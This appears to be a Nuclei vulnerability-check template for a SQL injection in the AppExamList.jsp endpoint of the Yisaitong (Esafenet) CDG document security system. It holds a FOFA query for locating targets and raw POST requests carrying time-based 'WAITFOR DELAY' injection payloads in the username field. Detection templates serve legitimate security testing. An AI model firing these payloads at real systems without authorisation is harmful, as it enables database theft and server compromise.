id: yisaitong-CDG-AppExamList_jsp-sql-time

info:
  name: 亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="亿赛通-电子文档安全管理系统" || app="亿赛通-DLP"
    亿赛通电子文档安全管理系统 AppExamList.jsp接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/gc7Fy6MnKqAHZ4CqxIStYA
  tags: sql injection

http:
  - raw:
      - |
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: https://{{Hostname}}/CDGServer3/client/AppExamList.jsp;Servicelogin

        username=1'WAITFOR+DELAY'0%3a0%3a2'--
      - |
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: https://{{Hostname}}/CDGServer3/client/AppExamList.jsp;Servicelogin

        username=1'WAITFOR+DELAY'0%3a0%3a4'--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and